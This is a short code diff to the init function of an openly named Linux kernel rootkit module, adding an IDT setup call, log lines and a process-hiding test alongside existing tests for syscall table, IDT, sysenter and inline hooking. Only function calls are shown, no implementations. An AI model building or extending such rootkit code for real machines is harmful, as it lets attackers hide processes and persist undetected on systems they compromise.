@@ -2,6 +2,7 @@
 #include "idt.h"
 #include "symbol.h"
 #include "../tests/tests.h"
+#include "../tests/features/feature_tests.h"
 
 #include <linux/module.h>
 #include <linux/kernel.h>
@@ -9,18 +10,20 @@
 static int __init rootkit_init_module(void)
 {
     /* Init rootkit */
+    idt_init();
     init_symbols();
 
-#if 1
     /* Run some tests */
+    pr_log("Core functions:\n");
     test_inline_hooking();
     test_hook();
     test_syscall_tbl();
     test_idt_hijacking();
     test_sysenter();
     test_debug_reg();
-#endif
 
+    pr_log("Feature functions:\n");
+    test_process_hiding();
     return 0;
 }
 
